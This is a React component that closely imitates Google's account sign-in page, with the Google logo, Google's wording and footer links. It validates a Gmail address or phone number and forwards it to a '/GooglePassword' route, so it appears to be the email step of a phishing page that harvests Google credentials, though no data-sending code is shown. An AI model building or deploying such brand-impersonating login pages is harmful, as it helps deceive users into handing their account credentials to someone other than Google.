import { useState } from "react";
import { useNavigate } from "react-router-dom";
import toast from 'react-hot-toast';

const GoogleIcon = () => (
  <svg width="40" height="40" viewBox="0 0 48 48">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
);

export default function GoogleSignInEmail() {
  const [email, setEmail] = useState("");
  const [focused, setFocused] = useState(false);
  const navigate = useNavigate();

  return (
    <div style={{
      minHeight: "100vh",display: "flex",
      flexDirection: "column", alignItems: "center", justifyContent: "center",
      fontFamily: "'Google Sans', Roboto, sans-serif"
    }}>

      {/* Card */}
      <div style={{
        background: "#1e1e1e", borderRadius: "16px", width: "90%", maxWidth: "900px",
        padding: "52px 60px", display: "flex", gap: "100px", alignItems: "center",
        boxShadow: "0 4px 32px rgba(0,0,0,0.5)"
      }}>

        {/* Left */}
        <div style={{ flex: "0 0 auto", maxWidth: "260px" }}>
          <GoogleIcon />
          <h1 style={{ color: "#fff", fontSize: "36px", fontWeight: "400", margin: "28px 0 16px" }}>Sign in</h1>
          <p style={{ color: "#e0e0e0", fontSize: "16px", lineHeight: "1.6", margin: 0 }}>
            with your Google Account. This account will be available to other Google apps in the browser.
          </p>
        </div>

        {/* Right */}
        <div style={{ flex: 1 }}>

          {/* Outlined floating label input */}
          <div style={{ position: "relative", marginBottom: "16px" }}>
            <fieldset style={{
              border: `1px solid ${focused || email ? "#8ab4f8" : "#666"}`,
              borderRadius: "6px", padding: "0 12px", margin: 0,
              transition: "border-color 0.2s"
            }}>
              <legend style={{
                fontSize: "12px", color: focused || email ? "#8ab4f8" : "#aaa",
                padding: "0 4px", transition: "color 0.2s"
              }}>
                Email or phone
              </legend>
    
              <input
                type="text"
                value={email}
                placeholder="Enter Gmail"
                onChange={e => setEmail(e.target.value)}
                onFocus={() => setFocused(true)}
                onBlur={() => setFocused(false)}
                style={{
                  width: "100%", background: "transparent", border: "none",
                  outline: "none", color: "#fff", fontSize: "16px",
                  padding: "8px 0 12px", boxSizing: "border-box"
                }}
              />
            </fieldset>
          </div>

          {/* Forgot email */}
          <a href="#" style={{ color: "#8ab4f8", fontSize: "14px", textDecoration: "none", fontWeight: "500" }}>
            Forgot email?
          </a>

          {/* Guest mode note */}
          <p style={{ color: "#e0e0e0", fontSize: "14px", marginTop: "32px", lineHeight: "1.6" }}>
            Not your computer? Use Guest mode to sign in privately.{" "}
            <a href="#" style={{ color: "#8ab4f8", textDecoration: "none", fontWeight: "500" }}>
              Learn more about using Guest mode
            </a>
          </p>

          {/* Actions */}
          <div style={{
            display: "flex", justifyContent: "flex-end",
            alignItems: "center", marginTop: "48px", gap: "24px"
          }}>
            <a href="/signup" style={{ color: "#8ab4f8", fontSize: "14px", textDecoration: "none", fontWeight: "500" }}>
              Create account
            </a>
            <button
              onClick={() => {
                if (!email) {
                  toast.error("Please enter your email or phone number");
                  return;
                }
                if (email.includes("@")) {
                  if (!email.endsWith("@gmail.com")) {
                    toast.error("Please enter a valid Gmail address (@gmail.com)");
                    return;
                  }
                } else {
                  if (!/^\d{10}$/.test(email)) {
                    toast.error("Please enter a valid 10-digit phone number");
                    return;
                  }
                }
                navigate("/GooglePassword", { state: { email } });
              }}
              style={{
                background: "#8ab4f8", color: "#1a1a1a", border: "none",
                borderRadius: "999px", padding: "12px 28px",
                fontSize: "15px", fontWeight: "600", cursor: "pointer"
              }}
              onMouseEnter={e => e.target.style.background = "#aecbfa"}
              onMouseLeave={e => e.target.style.background = "#8ab4f8"}
              >
              Next
            </button>
          </div>

        </div>
      </div>

      {/* Footer */}
      <div style={{
        display: "flex", justifyContent: "space-between",
        width: "90%", maxWidth: "900px", marginTop: "20px", padding: "0 4px"
      }}>
        <select style={{ background: "transparent", border: "none", color: "#aaa", fontSize: "13px", cursor: "pointer" }}>
          <option>English (United States)</option>
        </select>
        <div style={{ display: "flex", gap: "24px" }}>
          {["Help", "Privacy", "Terms"].map(item => (
            <a key={item} href="#" style={{ color: "#aaa", fontSize: "13px", textDecoration: "none" }}>{item}</a>
          ))}
        </div>
      </div>

    </div>
  );
}